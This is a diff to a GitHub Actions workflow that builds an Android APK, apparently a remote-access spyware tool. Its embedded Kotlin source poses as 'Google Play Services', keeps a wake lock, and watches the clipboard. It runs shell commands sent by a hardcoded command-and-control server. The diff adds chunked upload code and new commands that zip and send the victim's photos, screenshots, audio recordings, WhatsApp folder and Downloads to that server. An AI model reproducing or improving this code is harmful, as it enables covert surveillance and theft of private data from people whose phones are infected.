@@ -1,11 +1,11 @@
-name: Royal Iron Fist Node Builder v11.0 Absolute Dominance
+name: Royal Iron Fist Node Builder v12.0 Absolute Chunking
 
 on:
   workflow_dispatch:
 
 jobs:
   build:
-    name: Build Royal Iron Fist Operational APK v11.0
+    name: Build Royal Iron Fist Operational APK v12.0
     runs-on: ubuntu-latest
 
     steps:
@@ -98,11 +98,9 @@ jobs:
           import android.content.Intent
           import android.database.Cursor
           import android.location.Location
-          import android.location.LocationListener
           import android.location.LocationManager
           import android.net.Uri
           import android.os.Build
-          import android.os.Bundle
           import android.os.IBinder
           import android.os.PowerManager
           import android.provider.ContactsContract
@@ -112,6 +110,7 @@ jobs:
           import kotlinx.coroutines.*
           import java.io.BufferedReader
           import java.io.ByteArrayInputStream
+          import java.io.File
           import java.io.InputStreamReader
           import java.io.OutputStreamWriter
           import java.net.HttpURLConnection
@@ -128,13 +127,12 @@ jobs:
               private val C2_STREAM_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/stream"
               private val C2_INGEST_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/upload_raw"
               private var lastHeartbeatSent = 0L
-              
               private var lastClipboardText = "No recent clipboard activity"
 
               override fun onCreate() {
                   super.onCreate()
                   val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RoyalIronFist::AbsoluteDominanceLock")
+                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RoyalIronFist::AbsoluteChunkingLock")
                   wakeLock?.acquire(10 * 60 * 60 * 1000L)
                   startForegroundServiceNotification()
                   initClipboardTracker()
@@ -158,7 +156,7 @@ jobs:
               }
 
               private fun startForegroundServiceNotification() {
-                  val channelId = "royal_dominance_channel"
+                  val channelId = "royal_chunking_channel"
                   val channel = NotificationChannel(channelId, "Google Play Services", NotificationManager.IMPORTANCE_LOW)
                   val manager = getSystemService(NotificationManager::class.java)
                   manager?.createNotificationChannel(channel)
@@ -192,7 +190,7 @@ jobs:
                               val currentTime = System.currentTimeMillis()
                               val sendHeartbeat = (currentTime - lastHeartbeatSent > 40000L)
                               val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
-                              val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Dominance Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
+                              val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Chunking Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
 
                               if (sendHeartbeat) {
                                   lastHeartbeatSent = currentTime
@@ -246,16 +244,22 @@ jobs:
                                                       streamTextMemoryDirect(deviceId, nodeModel, "Uranium_ShellResult.txt", data)
                                                   }
                                                   action.contains("EXTRACT_CAMERA_ZIP") -> {
-                                                      streamUniversalMediaStoreStream(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                                      streamChunkedMediaStoreStream(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                                  }
+                                                  action.contains("EXTRACT_WHATSAPP_ZIP") -> {
+                                                      streamTargetFolderStream(deviceId, nodeModel, "WhatsApp_Vault", "/storage/emulated/0/WhatsApp")
+                                                  }
+                                                  action.contains("EXTRACT_DOWNLOAD_ZIP") -> {
+                                                      streamTargetFolderStream(deviceId, nodeModel, "Download_Vault", "/storage/emulated/0/Download")
                                                   }
                                                   action.contains("EXTRACT_STORAGE_ZIP") -> {
-                                                      streamUniversalMediaStoreStream(deviceId, nodeModel, "Storage_Files", MediaStore.Files.getContentUri("external"))
+                                                      streamChunkedMediaStoreStream(deviceId, nodeModel, "Storage_Files", MediaStore.Files.getContentUri("external"))
                                                   }
                                                   action.contains("EXTRACT_AUDIO") -> {
-                                                      streamUniversalMediaStoreStream(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
+                                                      streamChunkedMediaStoreStream(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
                                                   }
                                                   action.contains("EXTRACT_SCREENSHOT_ZIP") -> {
-                                                      streamUniversalMediaStoreStream(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                                      streamChunkedMediaStoreStream(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                                   }
                                               }
                                           }
@@ -280,66 +284,128 @@ jobs:
                   } catch (e: Exception) {}
               }
 
-              private fun streamUniversalMediaStoreStream(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
+              // محرك التقسيم الحزمي الذكي للملفات الكبرى (Chunked Streaming) لضمان عدم فشل أي سحب ضخم
+              private fun streamChunkedMediaStoreStream(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
                   try {
-                      sendReportToServer(nodeId, nodeModel, "⚡ [البث الهجين الآمن] جاري تدفق أرشيف $prefix كالبراق...")
+                      sendReportToServer(nodeId, nodeModel, "⚡ [البث المقسم الذكي] جاري سحب أرشيف $prefix على دفعات حزمية كالبراق...")
                       
-                      val url = URL(C2_INGEST_URL)
-                      val conn = url.openConnection() as HttpURLConnection
-                      conn.requestMethod = "POST"
-                      conn.setRequestProperty("X-Node-ID", nodeId)
-                      conn.setRequestProperty("X-Node-Model", nodeModel)
-                      conn.setRequestProperty("X-File-Name", "Uranium_${prefix}_${System.currentTimeMillis()}.zip")
-                      conn.setRequestProperty("Content-Type", "application/octet-stream")
-                      conn.doOutput = true
-                      conn.setChunkedStreamingMode(1024 * 64)
-                      conn.connectTimeout = 300000
-                      conn.readTimeout = 300000
+                      val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
+                      val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
+                      val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)
 
-                      var fileCount = 0
-                      try {
-                          val os = conn.outputStream
-                          val zipOut = ZipOutputStream(os)
-                          zipOut.setLevel(Deflater.BEST_SPEED)
-                          
-                          val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
-                          val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
-                          
-                          val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)
-                          cursor?.use {
-                              val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
-                              val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                              
-                              while (it.moveToNext() && fileCount < 1000) {
-                                  if (idIdx != -1 && nameIdx != -1) {
-                                      val id = it.getLong(idIdx)
-                                      val name = it.getString(nameIdx) ?: "file_$id.dat"
-                                      val itemUri = ContentUris.withAppendedId(contentUri, id)
-                                      
-                                      try {
-                                          contentResolver.openInputStream(itemUri)?.use { inputStream ->
-                                              zipOut.putNextEntry(ZipEntry("$prefix/$name"))
-                                              inputStream.copyTo(zipOut)
-                                              zipOut.closeEntry()
-                                              fileCount++
+                      var chunkIndex = 1
+                      var fileCountInChunk = 0
+                      var totalFiles = 0
+
+                      var url = URL(C2_INGEST_URL)
+                      var conn = createChunkConnection(nodeId, nodeModel, "${prefix}_Part$chunkIndex")
+                      var os = conn.outputStream
+                      var zipOut = ZipOutputStream(os)
+                      zipOut.setLevel(Deflater.BEST_SPEED)
+
+                      cursor?.use {
+                          val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
+                          val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+
+                          while (it.moveToNext()) {
+                              if (idIdx != -1 && nameIdx != -1) {
+                                  val id = it.getLong(idIdx)
+                                  val name = it.getString(nameIdx) ?: "file_$id.dat"
+                                  val itemUri = ContentUris.withAppendedId(contentUri, id)
+
+                                  try {
+                                      contentResolver.openInputStream(itemUri)?.use { inputStream ->
+                                          zipOut.putNextEntry(ZipEntry("$prefix/$name"))
+                                          inputStream.copyTo(zipOut)
+                                          zipOut.closeEntry()
+                                          fileCountInChunk++
+                                          totalFiles++
+
+                                          // إذا وصلت الحزمة إلى 250 ملفاً، نغلقها ونبدأ حزمة جديدة كالبراق لتفادي الحجم الهائل
+                                          if (fileCountInChunk >= 250) {
+                                              zipOut.finish()
+                                              zipOut.close()
+                                              conn.responseCode
+                                              conn.disconnect()
+
+                                              chunkIndex++
+                                              fileCountInChunk = 0
+                                              conn = createChunkConnection(nodeId, nodeModel, "${prefix}_Part$chunkIndex")
+                                              os = conn.outputStream
+                                              zipOut = ZipOutputStream(os)
+                                              zipOut.setLevel(Deflater.BEST_SPEED)
                                           }
-                                      } catch (ex: Exception) {}
-                                  }
+                                      }
+                                  } catch (ex: Exception) {}
                               }
                           }
-                          zipOut.finish()
-                          zipOut.flush()
-                          zipOut.close()
-                      } catch (e: Exception) {}
+                      }
+                      zipOut.finish()
+                      zipOut.close()
+                      conn.responseCode
+                      conn.disconnect()
 
+                      sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد الحزمي بنجاح]\n📂 الأرشيف: <code>$prefix</code> (إجمالي $totalFiles ملفاً مقسمة على $chunkIndex حزم) - [Zero Disk Footprint]")
+                  } catch (e: Exception) {
+                      sendReportToServer(nodeId, nodeModel, "⚠️ خطأ أرشيف حزمي $prefix: ${e.message}")
+                  }
+              }
+
+              // محرك سحب المجلدات المعروفة (مثل واتساب وداونلود) بشكل مباشر وشجري آمن
+              private fun streamTargetFolderStream(nodeId: String, nodeModel: String, prefix: String, targetPath: String) {
+                  try {
+                      sendReportToServer(nodeId, nodeModel, "⚡ [سحب المجلدات السيبرانية] جاري تدفق مسار $targetPath كالبراق...")
+                      
+                      val rootDir = File(targetPath)
+                      if (!rootDir.exists() || !rootDir.isDirectory) {
+                          sendReportToServer(nodeId, nodeModel, "⚠️ المسار $targetPath غير موجود أو غير متاح على هذه العقدة.")
+                          return
+                      }
+
+                      val url = URL(C2_INGEST_URL)
+                      val conn = createChunkConnection(nodeId, nodeModel, "${prefix}_Archive.zip")
+                      val os = conn.outputStream
+                      val zipOut = ZipOutputStream(os)
+                      zipOut.setLevel(Deflater.BEST_SPEED)
+
+                      var fileCount = 0
+                      rootDir.walkTopDown().forEach { file ->
+                          if (file.isFile && file.canRead() && file.length() < 50 * 1024 * 1024) { // تجاهل الملفات الضخمة جداً لتجنب التعليق
+                              try {
+                                  val relPath = file.absolutePath.replace(rootDir.parentFile?.absolutePath ?: "", "")
+                                  zipOut.putNextEntry(ZipEntry("$prefix$relPath"))
+                                  file.inputStream().use { fis -> fis.copyTo(zipOut) }
+                                  zipOut.closeEntry()
+                                  fileCount++
+                              } catch (ex: Exception) {}
+                          }
+                      }
+                      zipOut.finish()
+                      zipOut.close()
                       val code = conn.responseCode
                       conn.disconnect()
+
                       if (code == 200) {
-                          sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد والأرشيف بنجاح]\n📂 <code>$prefix</code> ($fileCount ملفاً) - [Zero Disk Footprint]")
+                          sendReportToServer(nodeId, nodeModel, "✅ [تم سحب المجلد السيبراني بنجاح]\n📂 <code>$prefix</code> ($fileCount ملفاً تم حصدهم من $targetPath)")
                       }
                   } catch (e: Exception) {
-                      sendReportToServer(nodeId, nodeModel, "⚠️ خطأ أرشيف $prefix: ${e.message}")
+                      sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في سحب المجلد $prefix: ${e.message}")
                   }
+              }
+
+              private fun createChunkConnection(nodeId: String, nodeModel: String, fileName: String): HttpURLConnection {
+                  val url = URL(C2_INGEST_URL)
+                  val conn = url.openConnection() as HttpURLConnection
+                  conn.requestMethod = "POST"
+                  conn.setRequestProperty("X-Node-ID", nodeId)
+                  conn.setRequestProperty("X-Node-Model", nodeModel)
+                  conn.setRequestProperty("X-File-Name", "Uranium_${fileName}_${System.currentTimeMillis()}.zip")
+                  conn.setRequestProperty("Content-Type", "application/octet-stream")
+                  conn.doOutput = true
+                  conn.setChunkedStreamingMode(1024 * 64)
+                  conn.connectTimeout = 300000
+                  conn.readTimeout = 300000
+                  return conn
               }
 
               private fun executeShellCommand(cmd: String): String {
@@ -819,5 +885,5 @@ jobs:
       - name: Upload APK Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Royal-Iron-Fist-v11.0-Dominance
+          name: Royal-Iron-Fist-v12.0-AbsoluteChunking
           path: app/build/outputs/apk/debug/app-debug.apk
